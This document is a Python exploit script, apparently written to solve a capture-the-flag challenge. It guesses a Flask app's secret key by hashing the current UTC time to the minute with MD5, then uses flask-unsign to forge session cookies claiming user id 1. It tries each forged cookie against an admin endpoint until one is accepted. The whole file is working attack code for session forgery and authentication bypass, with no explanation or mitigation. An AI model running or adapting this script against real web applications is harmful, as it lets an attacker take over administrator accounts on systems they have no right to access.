import datetime
import hashlib
import requests
import sys
import time
import subprocess
from pwn import warn, info



def gen_secret():
    info("Generating a secret....")

    old_secret = []

    for i in range(15):
        secret = hashlib.md5(datetime.datetime.utcnow().strftime("%d/%m/%Y %H:%M").encode()).hexdigest()
        if secret not in old_secret:
            old_secret.append(secret)
            info(f"Secret: {secret}")
        time.sleep(1)
    
    return old_secret

def check_cookie(cookie):
    header = {"Cookie": f"session={cookie}"}
    
    r = requests.get(url + "/admin/schemas", headers=header)
    
    if "Schemas" in r.text:
        info(f"Valid Cookie: {cookie}")
        sys.exit(0)
        
def gen_cookie(secret):
    info(f"Generating cookie for secret: {secret}")
    
    cookie = subprocess.check_output(["flask-unsign", "--sign", "--cookie", "{'id': 1}", "--secret", str(secret)]).decode().strip()
    
    return cookie
    
if __name__ == "__main__":
    warn("Make sure you start this script right away after clicking deploy!!!!!")
    
    secret = gen_secret()
    
    url = input("Input the target url: ")
    if not url.startswith("https"):
        warn("Make sure to input the full url")
        sys.exit(1)

    for s in secret:
        cookie = gen_cookie(s)
        
        check_cookie(cookie)
    
    